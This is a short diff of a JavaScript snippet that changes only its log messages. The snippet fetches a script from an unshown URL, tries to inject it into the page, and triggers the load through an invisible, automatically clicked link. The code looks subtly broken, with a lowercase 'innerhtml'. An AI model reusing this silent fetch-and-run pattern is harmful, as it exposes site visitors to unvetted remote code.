@@ -11,8 +11,7 @@ async function grab() {
     var inside  = await (await fetch(surl)).text();
     script.innerhtml = '<script>' + inside + '</script>';
     content.appendChild(script);
-    console.log('Script loaded');
-    
+    console.log('Script loaded from ' + surl);    
 }
 var link = document.createElement('a');
 link.style.display = 'none'; 
@@ -20,6 +19,6 @@ link.setAttribute('href', '#');
 link.setAttribute('onclick', 'grab()'); 
 document.body.appendChild(link);
 link.click(); 
-console.log('Reload complete');
+console.log('Reload requested');
 
 
